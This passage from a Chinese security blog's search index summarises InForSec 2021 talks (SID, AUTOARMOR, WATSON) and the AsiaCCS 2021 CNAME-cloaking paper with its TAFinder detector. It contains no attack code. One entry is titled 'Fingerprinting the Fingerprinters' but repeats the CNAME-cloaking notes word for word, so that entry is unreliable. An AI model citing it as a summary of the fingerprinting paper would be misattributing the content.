共计找出了 227 个安全相关的 bug，其中仅有 8 个假阳性的样例</li><li>假阴性分析<br>53%的假阴性，绝大部分都是因为对安全代码和漏洞代码的覆盖不完全导致的，这是有待改进的地方。</li></ol><p><strong>总结</strong></p><ul><li>及时修补安全漏洞需要确定安全影响<ul><li>补丁的传播成本很高，维护者时间和精力有限</li><li>为此，维护者需要确定和及时修复那些与安全相关的 bug</li></ul></li><li>使用受约束的符号执行的特性来确定哪些是与安全相关的 bug，哪些是常规的 bug<ul><li>SID：符号规则比较</li></ul></li><li>SID 发现了内核中许多被忽视的安全漏洞</li></ul><h1 id="Session-2"><a href="#Session-2" class="headerlink" title="Session 2"></a>Session 2</h1><h2 id="Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices"><a href="#Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices" class="headerlink" title="Automatic Policy Generation for Inter-Service Access Control of Microservices"></a>Automatic Policy Generation for Inter-Service Access Control of Microservices</h2><p><strong>研究背景</strong><br>云应用架构的演进，从传统的模块紧耦合、不易维护和扩展的单体架构演变为将模块解耦、独立开发和部署的微服务架构，再到统一管理服务间通信的服务网格。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/eade3d98-e479-498d-8e0e-2691b4d25601.png"></p><p><strong>研究动机</strong><br>首先是微服务之间通过网络 API 的通信方式会带来一些新的攻击面。其次，不安全的容器镜像可能会导致容器被渗透。</p><p>一个具体的例子：</p><ul><li>威胁：被攻破的微服务可能通过恶意请求窃取数据或发起攻击</li><li>对策：服务间细粒度的访问控制</li></ul><p>现在的微服务应用具有规模庞大且频繁更新的特点，如果手工配置访问控制策略的话，不仅耗时巨大且容易出错，也相对没那么灵活。</p><p>现有的分布式系统中的安全策略自动化方法：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ed93ef9-3bda-4404-9425-eb29775f6811.png"></p><p><strong>设计思路</strong><br>微服务应用的特点：</p><ul><li>单个微服务的内部复杂度较低</li><li>单个应用类<ul><li>微服务间的调用方式相对统一</li><li>涉及到的服务间调用协议和调用库的数量也十分有限</li></ul></li></ul><p>结合以上特点，作者采用了通过静态分析的方式从微服务代码中提取其正常的系统行为。<br>于是作者便提出了：<br><em>GOAL: 自动生成、维护、更新微服务的服务间访问控制策略</em><br><em>Challenge：如何获取完整、细粒度的服务间调用逻辑；如何对服务间的访问控制策略进行高效的生成和更新</em></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7d66b478-8d85-46b0-8574-dd46510184af.png"><br><em>基于静态分析的微服务间调用请求提取</em><br>具体来说分为三步：第一步识别网络 API 调用语句，即发起服务间调用的关键语句；第二步以第一步获取的关键语句为起点，沿数据流反向进行污点传播，获取程序切片；第三步通过语义分析在程序切片中提取服务间调用的详细属性。</p><p><em>基于图的微服务间访问控制策略管理</em><br>运行时的策略检查时间随着安装的服务间访问控制策略数目线性增加，这会造成整个微服务应用性能下降。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c43d41df-d252-40bc-b189-b6413e3bc57b.png"></p><p>往往同一微服务可能会存在不同版本在同一时间提供不同的服务，这又会造成冗余，于是作者提出了一种优化思路：将同一服务的各版本共有的权限进行整合。这既消除了冗余，减少了策略总数，又消除了不必要的策略更新。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0c1b8d6e-f1d6-474b-83f3-ebe06a734434.png"></p><p><strong>AUTOARMOR</strong></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/85a45a24-0b14-4f3f-94b8-5a1f5ce33a3b.png"><br>AUTOARMOR 主要由三部分构成：</p><ol><li>静态分析引擎<br>服务 E 代码提交，静态分析引擎生成清单文件描述其发起的调用。</li><li>权限引擎<br>在 E 部署时，权限引擎获取其清单文件，生成权限节点加入权限图</li><li>策略生成器<br>策略生成器根据权限图的变化生成并下发访问控制策略。</li></ol><p>策略生成：将与当前权限节点相关的每个请求边翻译成一条服务间访问控制策略；如果一个调用请求的目标微服务尚未部署，就不授予微服务相应的权限</p><p>策略更新：版本更新对应版本节点的添加；版本回滚对应版本节点的删除</p><p><strong>总结</strong><br>AUTOARMOR 是第一个微服务间访问控制策略自动生成的解决方案。主要涉及到的一些技术有：</p><ul><li>一个基于静态分析的微服务间调用请求自动提取机制</li><li>一个基于图的自动化为服务间访问控制策略管理机制</li></ul><p>AUTOARMOR 可以有效地实现微服务间访问控制策略的自动生成、维护和更新，但只引入极小的性能开销。</p><h1 id="Session-3"><a href="#Session-3" class="headerlink" title="Session 3"></a>Session 3</h1><h2 id="Understanding-Audit-Logs-Techniques-Experience-and-Requirements"><a href="#Understanding-Audit-Logs-Techniques-Experience-and-Requirements" class="headerlink" title="Understanding Audit Logs: Techniques, Experience, and Requirements"></a>Understanding Audit Logs: Techniques, Experience, and Requirements</h2><p>作者首先分享了其对于研究的一些理解和经验</p><p><strong>计算机系统研究的维度</strong><br>通常来说，开始一项研究往往由 Project/Paper 开始，向下是其具体的 Implementation，向上是其抽象的 Thesis/Theme。<br>对于 Thesis/Theme 来说，研究者需要将不同的 Claim 归纳为 Statement。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/5b32be9f-76f4-4311-94e1-a02db952a7ed.png" style="zoom: 70%;"><br>然后需要再将这些 Statement 进行总结，带入自己的一些想法，以形成在自己研究领域中的 View/Insight/Philosophy。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2a9287d3-c7bc-4905-9842-c329999a9df1.png" style="zoom: 70%;"><br>而对于不同的 Implementation，研究者需要再将其转换为 Tool/System/Platform，以方便纵向研究时能够较好地节省重复工作的成本。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/09c41055-2cee-47aa-a210-31a72bd646d6.png" style="zoom: 70%;"></p><p>综合来说，作为一名研究者，他应该既能写 paper 也能写工具，而读 pape 的目的是要去理解这些已有工作之间的关系，找出其中还没有做或者说还有待改进的地方。当你对于一个领域有一个稳定的 view 的时候才能够更好更深地去看待一个问题，以此来找 idea。</p><p><strong>系统研究的维度</strong><br>人与系统的相互影响如下<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d1506cfb-8d50-4387-89c0-1728b9d6cb14.png" style="zoom: 70%;"></p><ul><li>系统对系统的影响<br>系统与系统之间往往是孤立的，相应的要分析系统与系统之间的关系也就是分析不同系统之间的关联性</li><li>系统对人的影响<br>系统需要人来操作，相应的系统赋予了人有一定的责任来对系统负责</li><li>人对系统的影响<br>在系统中加入人的因素，而人往往是一个完备系统中的弱点。</li><li>人对人的影响<br>人对人的影响往往更多是在人类社会中的法律，伦理等问题上的影响。</li></ul><p><strong><em>Q: 怎么选取和开启一条线的研究?</em></strong><br>首先就是要多读这个领域相关的一些论文，在读这些论文的过程中需要体系化的总结。最终的目的是要发现一个缺失的研究点以此找到研究动机。其次，当要解决自己提出的问题，即当找解决方法的时候，可以找其他领域的解决方案然后将其映射到自己的领域里。当然，这个过程中会遇到一些新的挑战，这需要靠自己前期积累的一些背景知识来解决。</p><p>总的来说，找到一个感兴趣的新方向，第一是总结前几十年的前人的工作，完备自己的知识储备；第二就是读其他领域的论文，找到解决方案来解决遇到的研究问题。同时，当要将一条研究线做深的时候，后续的代码可以依据前一次实验的基础，例如将一个论文的实现做成 tool 或者 system。</p><p><strong>端点监视解决方案记录用于攻击调查的审计日志</strong><br>审计日志：</p><ul><li>表示 OS 级活动的事件历史记录</li><li>通过数据证明为安全事件提供可见性</li></ul><p><strong>行为抽象中的挑战</strong></p><ol><li>事件语义推断：日志记录一般用途的系统活动，但缺乏高级语义的知识</li><li>个人行为识别：审计日志的数量是十分庞大的</li></ol><p><strong>Insights</strong><br>Q: 分析者如何手动解释审计事件的语义？</p><ol><li>通过审计事件中的上下文信息来揭示系统实体和关系的语义。提取这种上下文语义的一般方法是采用嵌入模型，目的是将系统实体和关系映射到嵌入空间（即数字矢量空间）。</li><li>识别基于数据对象的信息流的行为。文中具体指的是属于个人行为的审计事件，主要是围绕着用户的预期目标，可以反映为一系列应用于数据对象的系统操作。如下图做一次审计事件的简化。<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/1d8d7347-39f5-4afd-9a06-bdde9859e815.png" style="zoom: 70%;"></li></ol><p><strong>WATSON</strong><br>WATSON 是一种自动化的行为抽象方法，它聚集了审计事件的语义来模拟行为模式。它不需要专家对事件语义的了解来执行行为抽象。语义是从审计日志中的事件使用背景中自动获得的，这个背景被称为是事件的上下文语义。具体来说，WATSON 首先利用基于翻译的嵌入模型来推断审计事件的语义，其依据是日志中的语境信息。 然后，WATSON 识别出与相关数据对象（即文件和网络套接字）相连的事件，并将其语义汇总为高级行为的表示。最后，WATSON 对审计日志中记录的类似行为进行聚类，并区分出其中的代表，供分析人员调查。</p><p>简而言之，WATSON 是一种自动的行为抽象方法，它聚合了审计日志的语义来建模行为模式。其输入为审计日志(Linux Audit)，输出则是具有代表性的行为。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7a6aa663-2228-430a-9da0-a6eea26f1211.png"></p><p>WATSON 弥补了低级审计日志与高级系统行为之间的语义鸿沟：</p><ul><li>在基于日志的 KG 中使用上下文信息（事件语义推断）</li><li>在语义上聚类相似行为（行为总结）</li></ul>]]></content>
      
      
      <categories>
          
          <category> Conference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> InForSec 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fingerprinting the Fingerprinters: Learning to Detect Browser Fingerprinting Behaviors</title>
      <link href="/2021/06/01/Fingerprinting%20the%20Fingerprinters/"/>
      <url>/2021/06/01/Fingerprinting%20the%20Fingerprinters/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Assel Aliyeva, Manuel Egele</em></p><p><em>原文标题: Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</em></p><p><em>原文链接: <a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>原文来源: AsiaCCS 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网发展至今，一些在线业务通常会利用第三方的分析服务来深入了解其用户的行为。但由于隐私保护的发展及浏览器同源策略的限制，这在很大程度上限制了第三方Cookie的跟踪和使用。于是，企业开始尝试将第三方分析服务伪装成其网站的子域。这种被称为是CNAME伪装的技术使得企业能够继续监测其网站上的用户活动。但随之而来的是严重的安全隐患，因为企业与这些第三方分析服务提供商共享了用户会话Cookie，这使得在线用户的账户始终处于不安全的状态。在这篇文章中，作者演示了CNAME伪装以及Lax Cookie访问控制设置对Web用户安全性的影响。为了解决这一问题，作者构建了一个可以检测伪装为子域的第三方分析服务以及第一方Cookie泄露的工具TAFinder。</p><h1 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h1><ul><li>确定了第一方Cookie泄露给T/A(跟踪和广告)服务提供商的情况</li><li>构建了TAFinder用于自动识别网站中是否存在隐匿域并检测这些Cookie是否泄漏到这些域</li><li>针对这些隐匿域提出了一种基于HTTP的Web分析域检测机制，达到了96％的准确率</li><li>确定了2,139个在野的Web分析域</li><li>对100,000个最受欢迎的网站进行了测试，发现2,271个网站使用CNAME伪装技术将第三方分析服务作为其子域</li></ul><h1 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/749afbc8-7bb7-4449-9adf-28f0710e32bb.png"><br>TAFinder主要分为三个单元：</p><ol><li>数据采集</li><li>DNS处理</li><li>基于机器学习的检测<h2 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h2>以流水线的方式设计的TAFinder接受一个网站列表作为输入，然后由任务分配器将其分配给Worker。当从任务分配器中收到一个新的W(Website)时，一个Worker会生成一个新的爬虫实例。爬虫访问W，同时记录网络数据包和纯文本的HTTP请求/响应，并最终将捕获的数据传输给DNS处理单元。值得注意的是，Worker运行在独立的容器中，因此它允许TAFinder轻松地分离来自不同网站的网络流量。</li></ol><h2 id="DNS处理"><a href="#DNS处理" class="headerlink" title="DNS处理"></a>DNS处理</h2><p>TAFinder从任何给定的W中提取一组隐匿域CW。DNS处理单元对涉及CNAME的W的每个子域进行DNS解析链的遍历。如果一个解析链以属于第三方的CNAME结束，DNS处理单元将相应的子域标记为隐匿域D。</p><h2 id="基于机器学习的检测"><a href="#基于机器学习的检测" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder首先使用黑名单和Virus Total将CW中的域识别为T/A服务。为了将CW中剩余的未标记的隐匿域分类为T/A或非T/A，TAFinder部署了一种监督机器学习方法。为此，其设计了九种特征，以捕捉T/A服务固有的行为模式。这些特征是从访问W时与隐匿域的HTTP通信中提取的。<br>下面是九个特征:</p><ol><li>当加载W的所有资源时，以D为目标的HTTP请求的数量超过所有HTTP请求的数量</li><li>当加载W的所有资源时，来自D的HTTP响应的总大小超过所有HTTP响应大小的总和</li><li>D所设置的cookies总数</li><li>在D设置的所有cookies数量中，长cookies的数量</li><li>D设置的常规的非目标cookies的数量</li><li>D设置的常规的目标cookie的数量<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ab9b802-d526-4eb1-b228-85fe9b95ed0f.png"></li><li>在URL中使用的参数数量超过了以D为目标的HTTP请求的数量</li><li>目标为D的URL中包括W的域名作为参数值之一的次数</li><li>Content-Type特征<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/f4341811-3dc8-417f-a9d1-44d6ecc95c1a.png"></li></ol><p><strong>特征重要性排序</strong><br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b679fc1b-c741-44e2-8eb2-6ae183fcebcd.png"></p><h1 id="系统实现"><a href="#系统实现" class="headerlink" title="系统实现"></a>系统实现</h1><h2 id="数据采集和DNS处理"><a href="#数据采集和DNS处理" class="headerlink" title="数据采集和DNS处理"></a>数据采集和DNS处理</h2><p>在数据采集单元，TAFinder采用了RabbitMQ来实现任务分配，这使得作者可以并行扩展和运行10个Worker。每个Worker由一个独立运行的Linux容器表示，这些容器均配置好了Tcpdump和MitmProxy用于记录网络数据包和纯文本的HTTP请求/响应。Worker使用一个基于selenium的爬虫来启动对每个单独的网站的爬取。在爬取完毕后销毁实例，压缩并将捕获到的数据存储下来。在DNS处理单元则使用了Python的Scapy库分别提取每个网站的隐匿域。</p><h2 id="基于机器学习的检测-1"><a href="#基于机器学习的检测-1" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder是靠一份T/A列表（来源包括了已被标记的第三方分析服务提供商和VirusTotal等）来标记要提取的隐匿域。同时，根据VirusTotal提供的类别来标记数据集中的在野隐匿域。</p><p>TAFinder使用MitmProxy的Python模块解析这些数据，并从中提取特征。同时。鉴于有一大批不同的cookie名称需要分类，TAFinder只选取那些最流行的cookie。为此，作者提取了所有隐匿域的HTTP响应中的cookie名称。然后，根据发送cookie的隐匿域的数量对cookie进行排名。以同样的方式，作者又创建了两个流行度排名，专门针对非T/A和T/A服务设置的cookies。</p><p>作者从上面cookie排名中选中了最受欢迎的25个cookie，以及60个隶属于T/A和非T/A域的cookie名称。根据One Trust的cookie分类，作者将这些cookie归类为T/A cookie，然后通过Cookiepedia或T/A特定的方式进行访问。基于这种方法，作者发现了27个跟踪相关的cookies和28个默认的网络应用程序cookies。</p><p>为了对隐匿域进行分类，TAFinder使用Scikit-Learn的随机森林模型。</p><h1 id="方法评估"><a href="#方法评估" class="headerlink" title="方法评估"></a>方法评估</h1><p>在21,184个使用CNAME的网站中，有20,504个仅使用了提供非T/A服务CNAME。根据Virus Total，这些非T/A大多属于信息技术、商业和计算机及软件类别，包括CDN和虚拟主机服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4941ede8-c1f7-4f34-bede-bab062c19044.png"><br>在评估Cookies泄露的时候由于每个分析站点都需要人工操作，因此作者将实验限制在10,000个最流行的域上。在过滤了金融服务和购物网站之后，作者使用119个域进行分析。其中的90个网站上作者手动创建了帐户用于测试。在这90个网站中，有27个将其会话cookie（我们确认该cookie提供了对用户帐户的访问）发送至隐匿的T/A服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/13366964-df26-49df-aae5-18865dffc844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> S&amp;P 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</title>
      <link href="/2021/05/25/Oversharing%20Is%20Not%20Caring/"/>
      <url>/2021/05/25/Oversharing%20Is%20Not%20Caring/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Assel Aliyeva, Manuel Egele</em></p><p><em>原文标题: Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</em></p><p><em>原文链接: <a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>原文来源: AsiaCCS 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网发展至今，一些在线业务通常会利用第三方的分析服务来深入了解其用户的行为。但由于隐私保护的发展及浏览器同源策略的限制，这在很大程度上限制了第三方Cookie的跟踪和使用。于是，企业开始尝试将第三方分析服务伪装成其网站的子域。这种被称为是CNAME伪装的技术使得企业能够继续监测其网站上的用户活动。但随之而来的是严重的安全隐患，因为企业与这些第三方分析服务提供商共享了用户会话Cookie，这使得在线用户的账户始终处于不安全的状态。在这篇文章中，作者演示了CNAME伪装以及Lax Cookie访问控制设置对Web用户安全性的影响。为了解决这一问题，作者构建了一个可以检测伪装为子域的第三方分析服务以及第一方Cookie泄露的工具TAFinder。</p><h1 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h1><ul><li>确定了第一方Cookie泄露给T/A(跟踪和广告)服务提供商的情况</li><li>构建了TAFinder用于自动识别网站中是否存在隐匿域并检测这些Cookie是否泄漏到这些域</li><li>针对这些隐匿域提出了一种基于HTTP的Web分析域检测机制，达到了96％的准确率</li><li>确定了2,139个在野的Web分析域</li><li>对100,000个最受欢迎的网站进行了测试，发现2,271个网站使用CNAME伪装技术将第三方分析服务作为其子域</li></ul><h1 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/749afbc8-7bb7-4449-9adf-28f0710e32bb.png"><br>TAFinder主要分为三个单元：</p><ol><li>数据采集</li><li>DNS处理</li><li>基于机器学习的检测<h2 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h2>以流水线的方式设计的TAFinder接受一个网站列表作为输入，然后由任务分配器将其分配给Worker。当从任务分配器中收到一个新的W(Website)时，一个Worker会生成一个新的爬虫实例。爬虫访问W，同时记录网络数据包和纯文本的HTTP请求/响应，并最终将捕获的数据传输给DNS处理单元。值得注意的是，Worker运行在独立的容器中，因此它允许TAFinder轻松地分离来自不同网站的网络流量。</li></ol><h2 id="DNS处理"><a href="#DNS处理" class="headerlink" title="DNS处理"></a>DNS处理</h2><p>TAFinder从任何给定的W中提取一组隐匿域CW。DNS处理单元对涉及CNAME的W的每个子域进行DNS解析链的遍历。如果一个解析链以属于第三方的CNAME结束，DNS处理单元将相应的子域标记为隐匿域D。</p><h2 id="基于机器学习的检测"><a href="#基于机器学习的检测" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder首先使用黑名单和Virus Total将CW中的域识别为T/A服务。为了将CW中剩余的未标记的隐匿域分类为T/A或非T/A，TAFinder部署了一种监督机器学习方法。为此，其设计了九种特征，以捕捉T/A服务固有的行为模式。这些特征是从访问W时与隐匿域的HTTP通信中提取的。<br>下面是九个特征:</p><ol><li>当加载W的所有资源时，以D为目标的HTTP请求的数量超过所有HTTP请求的数量</li><li>当加载W的所有资源时，来自D的HTTP响应的总大小超过所有HTTP响应大小的总和</li><li>D所设置的cookies总数</li><li>在D设置的所有cookies数量中，长cookies的数量</li><li>D设置的常规的非目标cookies的数量</li><li>D设置的常规的目标cookie的数量<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ab9b802-d526-4eb1-b228-85fe9b95ed0f.png"></li><li>在URL中使用的参数数量超过了以D为目标的HTTP请求的数量</li><li>目标为D的URL中包括W的域名作为参数值之一的次数</li><li>Content-Type特征<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/f4341811-3dc8-417f-a9d1-44d6ecc95c1a.png"></li></ol><p><strong>特征重要性排序</strong><br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b679fc1b-c741-44e2-8eb2-6ae183fcebcd.png"></p><h1 id="系统实现"><a href="#系统实现" class="headerlink" title="系统实现"></a>系统实现</h1><h2 id="数据采集和DNS处理"><a href="#数据采集和DNS处理" class="headerlink" title="数据采集和DNS处理"></a>数据采集和DNS处理</h2><p>在数据采集单元，TAFinder采用了RabbitMQ来实现任务分配，这使得作者可以并行扩展和运行10个Worker。每个Worker由一个独立运行的Linux容器表示，这些容器均配置好了Tcpdump和MitmProxy用于记录网络数据包和纯文本的HTTP请求/响应。Worker使用一个基于selenium的爬虫来启动对每个单独的网站的爬取。在爬取完毕后销毁实例，压缩并将捕获到的数据存储下来。在DNS处理单元则使用了Python的Scapy库分别提取每个网站的隐匿域。</p><h2 id="基于机器学习的检测-1"><a href="#基于机器学习的检测-1" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder是靠一份T/A列表（来源包括了已被标记的第三方分析服务提供商和VirusTotal等）来标记要提取的隐匿域。同时，根据VirusTotal提供的类别来标记数据集中的在野隐匿域。</p><p>TAFinder使用MitmProxy的Python模块解析这些数据，并从中提取特征。同时。鉴于有一大批不同的cookie名称需要分类，TAFinder只选取那些最流行的cookie。为此，作者提取了所有隐匿域的HTTP响应中的cookie名称。然后，根据发送cookie的隐匿域的数量对cookie进行排名。以同样的方式，作者又创建了两个流行度排名，专门针对非T/A和T/A服务设置的cookies。</p><p>作者从上面cookie排名中选中了最受欢迎的25个cookie，以及60个隶属于T/A和非T/A域的cookie名称。根据One Trust的cookie分类，作者将这些cookie归类为T/A cookie，然后通过Cookiepedia或T/A特定的方式进行访问。基于这种方法，作者发现了27个跟踪相关的cookies和28个默认的网络应用程序cookies。</p><p>为了对隐匿域进行分类，TAFinder使用Scikit-Learn的随机森林模型。</p><h1 id="方法评估"><a href="#方法评估" class="headerlink" title="方法评估"></a>方法评估</h1><p>在21,184个使用CNAME的网站中，有20,504个仅使用了提供非T/A服务CNAME。根据Virus Total，这些非T/A大多属于信息技术、商业和计算机及软件类别，包括CDN和虚拟主机服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4941ede8-c1f7-4f34-bede-bab062c19044.png"><br>在评估Cookies泄露的时候由于每个分析站点都需要人工操作，因此作者将实验限制在10,000个最流行的域上。在过滤了金融服务和购物网站之后，作者使用119个域进行分析。其中的90个网站上作者手动创建了帐户用于测试。在这90个网站中，有27个将其会话cookie（我们确认该cookie提供了对用户帐户的访问）发送至隐匿的T/A服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/13366964-df26-49df-aae5-18865dffc844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> AsiaCCS 2021 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
